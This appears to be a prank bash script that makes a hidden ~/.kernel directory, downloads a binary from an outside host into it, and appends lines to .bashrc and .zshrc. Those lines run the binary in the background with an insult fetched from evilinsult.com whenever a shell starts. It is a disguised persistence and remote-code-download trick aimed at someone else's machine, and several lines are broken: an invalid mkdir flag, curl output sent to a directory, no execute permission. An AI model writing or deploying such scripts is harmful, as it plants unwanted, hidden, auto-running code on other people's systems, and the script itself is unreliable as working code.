#!/bin/bash
# Desc: xcowsay insulte
mkdir -f ~/.kernel
curl https://Waz0x.github.io/bin/xcowsay/bin > ~/.kernel/
curl https://Waz0x.github.io/bin/cow_med.png > ~/.kernel/
echo "cd ~/.kernel;./bin --image cow_med.png \"$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\";cd &" >> .bashrc
echo "cd ~/.kernel;./bin --image cow_med.png \"$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\";cd &" >> .zshrc